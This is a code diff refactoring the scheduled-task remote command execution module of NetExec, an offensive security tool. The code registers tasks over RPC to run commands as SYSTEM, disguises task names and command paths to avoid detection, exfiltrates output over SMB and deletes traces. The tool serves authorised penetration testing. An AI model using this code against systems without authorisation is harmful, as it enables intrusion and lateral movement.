@@ -1,59 +1,40 @@
 import os
 import base64
-from impacket.dcerpc.v5 import tsch, transport
-from impacket.dcerpc.v5.dtypes import NULL
-from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
-from nxc.helpers.misc import gen_random_string
-from nxc.paths import TMP_PATH
-from time import sleep
-from datetime import datetime, timedelta
 import contextlib
 import random
 import uuid
+from datetime import datetime, timedelta
+from time import sleep
+
+from impacket.dcerpc.v5 import tsch
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+
+from nxc.helpers.misc import gen_random_string
+from nxc.helpers.rpc import NXCRPCConnection
+from nxc.paths import TMP_PATH
 
 
 class TSCH_EXEC:
-    def __init__(self, target, share_name, username, password, domain, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
-        self.__target = target
-        self.__username = username
-        self.__password = password or ""
-        self.__domain = domain
-        self.__share_name = share_name
-        self.__lmhash = ""
-        self.__nthash = ""
+    def __init__(self, connection, logger=None, tries=None, share=None,
+                 # These options are used by the schtask_as module, except the run_task_as
+                 # that defaults to NT AUTHORITY\System user (SID S-1-5-18) if not specified
+                 run_task_as="S-1-5-18", run_cmd=None, output_filename=None, task_name=None, output_file_location=None):
+        self.__connection = connection
+        self.logger = logger
+        self.__tries = tries
+        self.__share = share
         self.__outputBuffer = b""
         self.__retOutput = False
-        self.__aesKey = aesKey
-        self.__doKerberos = doKerberos
-        self.__remoteHost = remoteHost
-        self.__kdcHost = kdcHost
-        self.__tries = tries
         self.__output_filename = None
-        self.__share = share
-        self.logger = logger
 
-        if hashes is not None:
-            if ":" in hashes:
-                self.__lmhash, self.__nthash = hashes.split(":")
-            else:
-                self.__nthash = hashes
+        # Optional args for finetuning the task execution, e.g. used in nxc/modules/schtask_as.py
+        self.task_name = task_name if task_name else self.get_legitimate_task_name()
+        self.run_task_as = run_task_as
+        self.run_cmd = run_cmd
+        self.output_filename = output_filename
+        self.output_file_location = output_file_location
 
-        stringbinding = rf"ncacn_np:{self.__target}[\pipe\atsvc]"
-        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
-        self.__rpctransport.setRemoteHost(self.__remoteHost)
-
-        if hasattr(self.__rpctransport, "set_credentials"):
-            self.__rpctransport.set_credentials(
-                self.__username,
-                self.__password,
-                self.__domain,
-                self.__lmhash,
-                self.__nthash,
-                self.__aesKey,
-            )
-            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
-
-    # ----------------------------------------------------------------------
     def execute(self, command, output=False):
         self.__retOutput = output
         self.execute_handler(command)
@@ -122,14 +103,17 @@ class TSCH_EXEC:
         current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
         self.logger.debug(f"Creation time: {current_time}")
 
-        self.__output_filename = f"C:\\ProgramData\\{task_filename}"
+        # Store the SMB-relative path (for getFile/deleteFile against the share)
+        self.__output_filename = f"\\ProgramData\\{task_filename}"
+        # Full Windows path for use inside the scheduled task command
+        output_windows_path = f"C:{self.__output_filename}"
 
         if self.__retOutput:
             if fileless:
-                local_ip = self.__rpctransport.get_socket().getsockname()[0]
-                ps_cmd = f"[IO.File]::WriteAllText('\\\\{local_ip}\\{self.__share_name}\\{legit_filename}', (& {{ {safer_command} }}))"
+                local_ip = self.__connection.local_ip
+                ps_cmd = f"[IO.File]::WriteAllText('\\\\{local_ip}\\{self.__connection.smb_share_name}\\{legit_filename}', (& {{ {safer_command} }}))"
             else:
-                ps_cmd = f"[IO.File]::WriteAllText('{self.__output_filename}', (& {{ {safer_command} }}))"
+                ps_cmd = f"[IO.File]::WriteAllText('{output_windows_path}', (& {{ {safer_command} }}))"
         else:
             # Optional obfuscation: randomize cmd path and args
             random_cmd_path = [
@@ -157,7 +141,7 @@ class TSCH_EXEC:
   </Triggers>
   <Principals>
     <Principal id="LocalSystem">
-      <UserId>S-1-5-18</UserId>
+      <UserId>{self.run_task_as}</UserId>
       <RunLevel>HighestAvailable</RunLevel>
     </Principal>
   </Principals>
@@ -188,35 +172,15 @@ class TSCH_EXEC:
 </Task>"""
 
     # ----------------------------------------------------------------------
-    def windows_path_to_smb(self, windows_path):
-        """Convert a Windows path to SMB path format correctly handling nested directories."""
-        return windows_path.replace("C:", "").replace("\\", "/").lstrip("/")
-
-    # ----------------------------------------------------------------------
     def execute_handler(self, command, fileless=False):
-        dce = self.__rpctransport.get_dce_rpc()
-        if self.__doKerberos:
-            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
-
-        dce.set_credentials(*self.__rpctransport.get_credentials())
-
-        try:
-            dce.connect()
-        except Exception as e:
-            self.logger.fail(f"Failed to connect to DCE/RPC service: {e!s}")
-            return
-
-        tmpName = self.get_legitimate_task_name()
-        self.logger.debug(f"Using task name: {tmpName}")
+        dce = NXCRPCConnection(self.__connection).connect(r"\atsvc", tsch.MSRPC_UUID_TSCHS, auth_level=RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
 
         xml = self.gen_xml(command, fileless)
-        self.logger.debug(f"Task XML: {xml}")
-        self.logger.info(f"Creating task: {tmpName}")
+        self.logger.debug(f"Using task name: {self.task_name}")
+        self.logger.info(f"Creating task: {self.task_name}")
 
         try:
-            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-            dce.bind(tsch.MSRPC_UUID_TSCHS)
-            tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
+            tsch.hSchRpcRegisterTask(dce, f"\\{self.task_name}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
             self.logger.debug("Task registered successfully")
         except Exception as e:
             if hasattr(e, "error_code") and e.error_code and hex(e.error_code) == "0x80070005":
@@ -229,124 +193,78 @@ class TSCH_EXEC:
 
         try:
             self.logger.debug("Attempting manual task execution...")
-            tsch.hSchRpcRun(dce, f"\\{tmpName}", NULL)
+            tsch.hSchRpcRun(dce, f"\\{self.task_name}", NULL)
             self.logger.debug("Task run request sent successfully")
         except Exception as e:
             self.logger.debug(f"Manual execution failed: {e!s}, relying on registration trigger")
 
-        sleep(3)
-        wait_attempts = 0
-        done = False
-        task_ran = False
-        max_attempts = 15
-
-        while not done and wait_attempts < max_attempts:
-            if self.__retOutput and wait_attempts >= 2:
-                try:
-                    self.logger.debug(f"Checking for output file (attempt {wait_attempts + 1})")
-                    smb_path = self.windows_path_to_smb(self.__output_filename)
-                    smbConnection = self.__rpctransport.get_smb_connection()
-                    smbConnection.getFile(self.__share, smb_path, self.output_callback)
-                    self.logger.debug("Found output file, task completed successfully")
-                    done = True
-                    task_ran = True
-                    break
-                except Exception as e:
-                    self.logger.debug(f"Output file check: {e}")
-
-            try:
-                self.logger.debug(f"Checking task execution status (attempt {wait_attempts + 1}/{max_attempts})")
-                resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
-                if resp["pLastRuntime"]["wYear"] != 0:
-                    self.logger.debug(f"Task \\{tmpName} has run successfully")
-                    done = True
-                    task_ran = True
-                else:
-                    self.logger.debug("Task has not completed yet, waiting...")
-                    wait_attempts += 1
-                    sleep(2)
-            except Exception as e:
-                self.logger.debug(f"Status check: {e}")
-                wait_attempts += 1
-                sleep(2)
+        if self.__retOutput:
+            if fileless:
+                self._retrieve_fileless_output()
+            else:
+                self._retrieve_output()
 
         try:
-            self.logger.info(f"Deleting task: {tmpName}")
-            tsch.hSchRpcDelete(dce, f"\\{tmpName}")
+            self.logger.info(f"Deleting task: {self.task_name}")
+            tsch.hSchRpcDelete(dce, f"\\{self.task_name}")
         except Exception as e:
             self.logger.debug(f"Error deleting task: {e!s}")
 
-        if not task_ran and self.__retOutput:
-            self.logger.debug("Task status unclear, waiting additional time for potential output")
-            sleep(3)
-
-        if self.__retOutput:
-            if fileless:
-                max_attempts = 10
-                attempts = 0
-                while attempts < max_attempts:
-                    try:
-                        file_path = os.path.join(TMP_PATH, "nxc_hosted", os.path.basename(self.__output_filename))
-                        self.logger.debug(f"Looking for fileless output at: {file_path}")
-                        with open(file_path) as output:
-                            self.output_callback(output.read())
-                        try:
-                            os.remove(file_path)
-                            self.logger.debug(f"Removed fileless output file: {file_path}")
-                        except OSError as e:
-                            self.logger.debug(f"Could not remove file {file_path}: {e}")
-                        break
-                    except OSError:
-                        sleep(1)
-                        attempts += 1
-            else:
-                smbConnection = self.__rpctransport.get_smb_connection()
-                tries = 1
-                smb_path = self.windows_path_to_smb(self.__output_filename)
-                output_basename = os.path.basename(self.__output_filename)
-
-                while tries <= self.__tries:
-                    try:
-                        self.logger.info(f"Attempting to read output from: {self.__output_filename}")
-                        smbConnection.getFile(self.__share, smb_path, self.output_callback)
-                        break
-                    except Exception as e:
-                        if "STATUS_BAD_NETWORK_NAME" in str(e):
-                            self.logger.fail(f"ATEXEC: Getting the output file failed - target blocked share: {self.__share}")
-                            break
-                        elif "STATUS_VIRUS_INFECTED" in str(e):
-                            self.logger.fail("Command did not run because a virus was detected")
-                            break
-                        elif "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
-                            self.logger.info(f"Path not found for {self.__output_filename}, trying alternate path...")
-                            try:
-                                alternate_path = output_basename
-                                self.logger.debug(f"Attempting with alternate path: {alternate_path}")
-                                smbConnection.getFile(self.__share, alternate_path, self.output_callback)
-                                self.logger.debug("Successfully retrieved file with alternate path")
-                                break
-                            except Exception as alt_e:
-                                self.logger.debug(f"Alternate path also failed: {alt_e}")
-                        elif "STATUS_SHARING_VIOLATION" in str(e):
-                            self.logger.info(f"File {output_basename} is still in use, retrying...")
-                        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
-                            self.logger.info(f"File {output_basename} not found, retrying...")
-                        else:
-                            self.logger.debug(f"Error reading output file: {e!s}. Retrying...")
-
-                        tries += 1
-                        sleep(1)
-                        if tries > self.__tries:
-                            self.logger.fail("ATEXEC: Could not retrieve output file after maximum attempts.")
-
-                if tries <= self.__tries:
-                    try:
-                        self.logger.debug(f"Deleting output file: {output_basename}")
-                        smbConnection.deleteFile(self.__share, smb_path)
-                    except Exception as e:
-                        self.logger.debug(f"Could not delete output file: {e!s}")
-                        with contextlib.suppress(Exception):
-                            smbConnection.deleteFile(self.__share, output_basename)
-
         with contextlib.suppress(Exception):
             dce.disconnect()
+
+    def _retrieve_output(self):
+        tries = 1
+        # Give the command a bit of time to execute before we try to read the output
+        sleep(0.4)
+        while True:
+            try:
+                self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
+                self.__connection.conn.getFile(self.__share, self.__output_filename, self.output_callback)
+                break
+            except Exception as e:
+                if tries >= self.__tries:
+                    self.logger.fail("ATEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
+                    break
+                if "STATUS_BAD_NETWORK_NAME" in str(e):
+                    self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
+                    break
+                elif "STATUS_VIRUS_INFECTED" in str(e):
+                    self.logger.fail("Command did not run because a virus was detected")
+                    break
+                if "STATUS_SHARING_VIOLATION" in str(e):
+                    self.logger.info(f"File {self.__share}\\{self.__output_filename} is still in use with {self.__tries - tries} tries left, retrying...")
+                    tries += 1
+                    sleep(1)
+                elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
+                    self.logger.info(f"File {self.__share}\\{self.__output_filename} not found with {self.__tries - tries} tries left, deducting 10 tries and retrying...")
+                    tries += 10
+                    sleep(1)
+                else:
+                    self.logger.debug(f"Exception when trying to read output file: {e!s}. {self.__tries - tries} tries left, retrying...")
+                    tries += 1
+                    sleep(1)
+        try:
+            self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
+            self.__connection.conn.deleteFile(self.__share, self.__output_filename)
+        except Exception:
+            pass
+
+    def _retrieve_fileless_output(self):
+        max_attempts = 10
+        attempts = 0
+        while attempts < max_attempts:
+            try:
+                file_path = os.path.join(TMP_PATH, "nxc_hosted", os.path.basename(self.__output_filename))
+                self.logger.debug(f"Looking for fileless output at: {file_path}")
+                with open(file_path) as output:
+                    self.output_callback(output.read())
+                try:
+                    os.remove(file_path)
+                    self.logger.debug(f"Removed fileless output file: {file_path}")
+                except OSError as e:
+                    self.logger.debug(f"Could not remove file {file_path}: {e}")
+                break
+            except OSError:
+                sleep(1)
+                attempts += 1
